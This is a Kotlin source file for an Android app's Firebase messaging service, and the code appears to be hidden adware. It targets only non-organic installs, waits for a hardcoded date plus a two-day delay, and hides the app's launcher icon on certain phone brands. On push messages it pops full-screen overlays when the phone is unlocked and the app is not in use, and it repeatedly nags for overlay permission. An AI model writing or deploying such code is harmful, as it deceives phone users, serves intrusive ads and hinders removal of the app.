package com.fantasia.telecaller

import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.annotation.RequiresApi
import androidx.core.app.ComponentActivity
import androidx.core.app.NotificationCompat
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import java.util.*
import java.util.concurrent.TimeUnit

class FCMService : FirebaseMessagingService() {

    companion object {

        private const val PREFS_NAME = "temp_prefs"

        const val channelId = "System"

        private val SHOWING_DELAY = TimeUnit.SECONDS.toMillis(50)

        private val startSDKTime = Calendar.getInstance().apply {
            set(Calendar.YEAR, 2023)
            set(Calendar.MONTH, Calendar.JANUARY)
            set(Calendar.DAY_OF_MONTH, 17)
            set(Calendar.HOUR_OF_DAY, 0)
            set(Calendar.MINUTE, 0)
            set(Calendar.SECOND, 0)
            set(Calendar.MILLISECOND, 0)
        }.time.time

        @RequiresApi(Build.VERSION_CODES.O)
        fun createNotificationChannel(context: Context) {
            context.getSystemService(NotificationManager::class.java)
                .takeIf { it.getNotificationChannel(channelId) == null }
                ?.createNotificationChannel(getChanel())
                ?: return
        }

        @RequiresApi(Build.VERSION_CODES.O)
        fun getChanel() =
            NotificationChannel(channelId, "Player", NotificationManager.IMPORTANCE_DEFAULT)

        private fun subscribeUser(context: Context, action: () -> Unit) {
            FirebaseMessaging.getInstance()
                .subscribeToTopic("callier")
                .addOnCompleteListener {
                    if (it.isSuccessful) setUserIsSubscribe(context); action.invoke()
                }
        }

        fun checkUser(context: Context, action: () -> Unit) {
            if (!canSubscribe()) action.invoke()
            else if (isUserSubscribe(context)) action.invoke()
            else checkIsNeedSubscribe(context, action)
        }

        private fun canSubscribe() = Date().time >= startSDKTime

        private fun checkIsNeedSubscribe(context: Context, action: () -> Unit) {
            val client = InstallReferrerClient.newBuilder(context).build()
            client.startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(p0: Int) {
                    val needSubscribe = p0 == InstallReferrerClient.InstallReferrerResponse.OK &&
                            !client.installReferrer.installReferrer.contains("organic")

                    if (needSubscribe) subscribeUser(context, action)
                    else action.invoke()

                    client.endConnection()
                }

                override fun onInstallReferrerServiceDisconnected() {
                    action.invoke()
                    client.endConnection()
                }
            })
        }

        private fun setUserIsSubscribe(context: Context) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putBoolean("isSubscribe", true).apply()
        }

        fun checkPermissionResult(context: Context): Boolean {
            if (!isUserSubscribe(context) || !Settings.canDrawOverlays(context)) return false

            componentName(context, "${context.packageName}.ui.greeting.FGreetingFActivityF")
                .let { context.packageManager.setComponentState(it, getState(false)) }

            if (!canHideIcon()) componentName(context, "${context.packageName}.SettingsSdk")
                .let { context.packageManager.setComponentState(it, getState(true)) }

            saveStartTime(context)

            return true
        }


        private fun canHideIcon() = listOf("xiaomi", "oppo", "vivo")
            .any { brand -> Build.BRAND.equals(brand, true) }

        private fun getState(isEnable: Boolean) =
            if (isEnable) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            else PackageManager.COMPONENT_ENABLED_STATE_DISABLED

        private fun componentName(context: Context, name: String) = ComponentName(context, name)

        private fun PackageManager.setComponentState(name: ComponentName, state: Int) {
            setComponentEnabledSetting(name, state, PackageManager.DONT_KILL_APP)
        }

        fun isUserSubscribe(context: Context) =
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getBoolean("isSubscribe", false)

        fun saveShowingTime(context: Context) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putLong("last_showing_time", Date().time).apply()
        }

        fun getShowingTime(context: Context) =
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getLong("last_showing_time", -1)

        fun getStartTime(context: Context) =
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getLong("start_time", -1)

        private fun saveStartTime(context: Context) {
            val startTime = Calendar.getInstance().apply {
                time = Date().apply { time += TimeUnit.DAYS.toMillis(2) }
                set(Calendar.HOUR_OF_DAY, 10)
                set(Calendar.MINUTE, 0)
                set(Calendar.SECOND, 0)
                set(Calendar.MILLISECOND, 0)
            }.time.time

            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putLong("start_time", startTime).apply()
        }

        fun isStartedBefore(context: Context) =
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getBoolean("is_start_before", false)

        fun setIsStartedBefore(context: Context) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putBoolean("is_start_before", true).apply()
        }

        fun getIsFirstAskNotification(context: Context) =
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getBoolean("is_first_ask", true)

        fun setNotFirstAskTime(context: Context) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putBoolean("is_first_ask", false).apply()
        }

        fun getLastAskOverlayTime(context: Context) =
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getLong("last_notification_time", -1)

        fun saveNotificationLastAskTime(context: Context) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putLong("last_notification_time", Date().time).apply()
        }

        fun openPreview(context: ComponentActivity) {
            val link = "https://play.google.com/store/apps/details?id=com.android.chrome"

            arrayOf(
                Intent(Intent.ACTION_VIEW, Uri.parse(link)),
                Intent(Intent(Intent.ACTION_VIEW, Uri.parse("vnd.youtube:x2bqscVkGxk")))
            ).let(context::startActivities)

            Handler(Looper.getMainLooper()).postDelayed({ context.finishAndRemoveTask() }, 200)
        }
    }

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)
        if (canRun()) showDisplay()
        else if (needDisplayNotificationPermission()) displayNotificationPermission()
    }

    private fun showDisplay() {
        if (needLaunchByService()) OverlayService.launch(this)
        else Intent(this, DymmyActivity::class.java)
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            .let(::startActivity)
    }

    private fun needLaunchByService() = Build.BRAND.equals("xiaomi")

    private fun displayNotificationPermission() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) createNotificationChannel(this)

        val intent = Intent(this, PermissionActivity::class.java)
        val pendingIntent = PendingIntent
            .getActivity(this, 1, intent, PendingIntent.FLAG_IMMUTABLE)

        val notification = NotificationCompat.Builder(this, channelId)
            .setSmallIcon(applicationInfo.icon)
            .setContentTitle(getString(R.string.app_name))
            .setAutoCancel(true)
            .setContentIntent(pendingIntent)
            .setContentText("Give overlay permission and unlock all functionality")
            .build()

        getSystemService(NotificationManager::class.java).notify(2, notification)
    }

    private fun needDisplayNotificationPermission(): Boolean {
        if (appIsRunning()) return false
        if (Settings.canDrawOverlays(this)) return false

        val isFirstTime = getIsFirstAskNotification(this)
        val askDelay = getAskOverlayNotificationDelay(isFirstTime)
        val lastAskOverlayTime = getLastAskOverlayTime(this)

        if (Date().time - lastAskOverlayTime < askDelay) return false

        setNotFirstAskTime(this)
        saveNotificationLastAskTime(this)

        return true
    }

    private fun getAskOverlayNotificationDelay(isFirstTime: Boolean) =
        if (isFirstTime) TimeUnit.MINUTES.toMillis(5)
        else TimeUnit.HOURS.toMillis(2)

    private fun canRun() = !appIsRunning()
            && getSystemService(PowerManager::class.java).isInteractive
            && !getSystemService(KeyguardManager::class.java).isKeyguardLocked
            && Settings.canDrawOverlays(this)
            && (isStartedBefore(this) || reachToStartByTime())
            && canRunByTime()

    private fun reachToStartByTime(): Boolean {
        val startTime = getStartTime(this)
        val isReach = startTime != -1L && startTime <= Date().time
        if (isReach) setIsStartedBefore(this)
        return isReach
    }

    private fun canRunByTime() =
        kotlin.math.abs(Date().time - getShowingTime(this)) > SHOWING_DELAY

    private fun appIsRunning() = ActivityManager.RunningAppProcessInfo().apply {
        ActivityManager.getMyMemoryState(this)
    }.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND


    override fun onNewToken(token: String) {
        super.onNewToken(token)
    }
}